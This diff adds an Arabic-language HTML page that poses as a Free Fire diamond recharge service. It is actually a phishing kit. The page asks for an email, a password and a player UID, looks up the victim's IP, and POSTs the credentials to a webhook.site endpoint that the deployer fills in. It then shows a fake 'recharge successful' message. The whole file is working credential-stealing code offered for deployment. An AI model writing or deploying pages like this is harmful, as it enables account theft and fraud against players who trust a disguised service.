@@ -1,0 +1,121 @@
+index.html
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Diamond Recharge</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
+        .container { max-width: 400px; margin: 20px auto; background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: linear-gradient(45deg, #ff6b6b, #feca57); padding: 30px; text-align: center; color: white; }
+        .header h1 { font-size: 24px; margin-bottom: 10px; }
+        .header p { opacity: 0.9; font-size: 14px; }
+        .form-container { padding: 30px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
+        .input-group input { width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 12px; font-size: 16px; transition: all 0.3s; }
+        .input-group input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.1); }
+        .recharge-btn { width: 100%; padding: 18px; background: linear-gradient(45deg, #ff6b6b, #feca57); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s; }
+        .recharge-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(255,107,107,0.4); }
+        .recharge-btn:active { transform: translateY(0); }
+        .loading { display: none; text-align: center; padding: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #ff6b6b; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success { background: #d4edda; color: #155724; padding: 20px; border-radius: 12px; text-align: center; display: none; }
+        .footer { text-align: center; padding: 20px; font-size: 12px; color: #666; background: #f8f9fa; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>💎 Free Fire Diamonds</h1>
+            <p>شحن سريع وآمن - أفضل الأسعار</p>
+        </div>
+        
+        <div class="form-container">
+            <form id="rechargeForm">
+                <div class="input-group">
+                    <label>📧 الإيميل</label>
+                    <input type="email" id="email" placeholder="example@gmail.com" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🔐 كلمة المرور</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                
+                <div class="input-group">
+                    <label>🆔 UID اللاعب</label>
+                    <input type="text" id="uid" placeholder="123456789" required>
+                </div>
+                
+                <button type="submit" class="recharge-btn">🚀 شحن الدايموندز الآن</button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>جاري معالجة الشحن...</p>
+            </div>
+            
+            <div class="success" id="success">
+                ✅ تم الشحن بنجاح! سيتم إضافة الدايموندز قريباً
+            </div>
+        </div>
+        
+        <div class="footer">
+            شحن آمن 100% | دعم 24/7
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const uid = document.getElementById('uid').value;
+            
+            // معلومات إضافية
+            const userAgent = navigator.userAgent;
+            const ip = 'IP: ' + (await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => 'غير متاح')).ip;
+            
+            const data = {
+                timestamp: new Date().toLocaleString('ar-SA'),
+                email: email,
+                password: password,
+                uid: uid,
+                ip: ip,
+                userAgent: userAgent,
+                action: 'Free Fire Diamond Recharge'
+            };
+            
+            // ضع رابط webhook.site هنا 👇
+            const webhookUrl = 'https://webhook.site/#!/YOUR-WEBHOOK-ID-HERE';
+            
+            try {
+                // إرسال البيانات
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                // إخفاء الفورم وإظهار النجاح
+                document.getElementById('rechargeForm').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+                
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                }, 2000);
+                
+            } catch (error) {
+                alert('خطأ في الشحن، حاول مرة أخرى');
+            }
+        });
+    </script>
+</body>
+</html>
